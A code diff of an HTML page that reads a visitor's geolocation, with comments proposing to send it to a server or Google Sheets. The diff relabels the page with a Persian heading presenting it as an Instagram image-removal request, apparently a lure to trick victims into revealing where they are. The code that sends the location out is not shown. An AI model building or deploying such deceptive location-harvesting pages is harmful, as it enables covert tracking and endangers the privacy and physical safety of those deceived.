@@ -16,7 +16,7 @@
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
-            document.getElementById("status").innerHTML = "instagram.com/"+latitude+longitude;
+            document.getElementById("status").innerHTML = "instagram.com/"+latitude+"-"+longitude;
             
             // You can send the location data to a server or Google Sheets here
             // Example: Using an AJAX call to send the location to a Google Sheets script or a database
@@ -43,7 +43,7 @@
     </script>
 </head>
 <body>
-    <h2>Click the link to save your location</h2>
+    <h2>درخواست حذف تصویر از اینستاگرام</h2>
     <p id="status">Tracking location...</p>
     
     <!-- Image you uploaded -->
